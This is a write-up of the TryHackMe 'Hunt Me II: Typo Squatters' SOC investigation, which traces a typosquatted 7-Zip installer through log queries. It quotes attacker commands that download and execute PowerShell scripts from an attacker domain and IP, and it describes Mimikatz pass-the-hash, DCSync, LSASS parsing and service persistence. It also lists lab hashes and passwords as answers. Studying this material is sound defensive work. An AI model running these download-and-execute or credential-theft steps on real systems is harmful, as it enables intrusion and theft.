Hunt Me II: Typo Squatters (THM)

Summary / Report

Scenario

Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.

Last September 26, 2023, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.

1- What is the URL of the malicious software that was downloaded by the victim user?

http://www.7zipp.org/a/7z2301-x64.msi

since we know its download and its a zip file and we know the user

process.name: chrome.exe AND 7zipp* user.name:perry.parsons

2- What is the IP address of the domain hosting the malware?

206.189.34.218

“ dns.resolved_ip.keyword ”

3- What is the PID of the process that executed the malicious software?

2532

looking for the files that got downloaded we will foundmsiexec.exe executing the malicious file

msiexec.exe is the Windows Installer executable. It's responsible for installing, modifying, and uninstalling software that uses .msi (Microsoft Installer) or .msp (patch) files.

4- Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?

powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)

going back to question 1 there are some commands executed after the initial download

Legitimate msiexec → MSI → PowerShell chain abused to evade detection.

  • Parent: MSI542E.tmp (an unexpected MSI temp)
  • Child: powershell.exe iex(iwr http://7zipp.org/a/7z.ps1 -useb)
  • Context: Runs as SYSTEM (full rights)
  • Technique: Fileless download-and-execute (LOL-BAS) via PowerShell

5- The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?

C:\Windows\Temp\7zlegit.exe

powershell
Invoke-WebRequest `
  -Uri "https://www.7-zip.org/a/7z2301-x64.exe" `
  -OutFile "C:\Windows\Temp\7zlegit.exe"

so it reaches out to the real 7-Zip website, downloads the official 7-Zip installer (version 23.01 x64) into the Temp folder, and names it 7zlegit.exe.

6- What is the name of the service that was installed?

7zService

we already seen it but if we want to search and find it we can search with event code 4697

(provides information about changes to system services)

so what happened

  • Creates a new service named 7zService whose executable is the attacker-dropped 7zipp.exe (masquerading as 7-Zip).
  • Configures it to run automatically under the SYSTEM account.
  • Starts it immediately giving the malicious EXE persistent, high-privilege execution.

7- The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?

SYSTEM

look into the service log

Why attackers use services : 1- SYSTEM privileges: services often run as LocalSystem, giving full control. 2- Persistence: service set to Automatic will survive reboots. 3- Stealth: registered services blend into normal OS configuration.

8- After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?

Invoke-PowerExtract

if we look with the attacker ip

powershell
-C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;

That function parses the dump and extracts credentials (NT-hashes, LSA secrets, Kerberos tickets) purely in PowerShell—no external tools or debuggers needed

or we can just search with lsass.dmp

9- What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)

james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF

we use this query to check any credential dumping

winlog.event_id: 1 AND process.command_line: (mimikatz OR DumpCreds OR privilege\:\:debug OR sekurlsa\:\:)

from the output we see

1- Stage Mimikatz onto the host

  • Attacker pulls down the public Mimikatz ZIP from GitHub via Invoke-WebRequest (iwr) into m.zip.

2- Pass-the-Hash #1 (James Cromwell)

  • Executes Mimikatz’s sekurlsa::pth to inject James’s NTLM hash into a new PowerShell—no password needed.

3- Reload Mimikatz

  • Downloads Mimikatz again, ensuring the tool is available in the current working directory.

4- DCSync (Damian Hall)

  • Runs lsadump::dcsync to mimic a Domain Controller and request Damian’s account hashes from AD via the Directory Replication Service API .

5- Pass-the-Hash #2 (Damian Hall)

  • Uses the freshly obtained Damian Hall NTLM hash with sekurlsa::pth to spawn another PowerShell in Damian’s security context .

10- After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?

pwn3dpw!!!

usually the net.exe command is used for changing password also i already saw 2 compromised users i can search with anna.jones and damian.hall or i can search with event code = 1 all roads lead to rome

or event code 4724

11- What is the name of the workstation where the new account was used?

WKSTN-02

hostname

if we follow the logs can see that the attacker switched from WKSTN-03 to WKSTN-02.

12- After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?

SSF\itadmin:NoO6@39Sk0!

scrolling down a bit (still using event code 1 with username anna)

13- Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?

Invoke-SharpKatz.ps1

just continue digging with anna logs

14- What is the AES256 hash of the domain admin based on the credential dumping output?

f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534

We know that Mr Hall is the domain admin user.

Invoke-SharpKatz" AND message:"hall

or we can search with aes265

15- After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?

46

way back to question 2 we come across bomb.exe which the attacker download from his domain from its name we are pretty sure its the ransomware

process.name : bomb.exe AND winlog.event_id:11
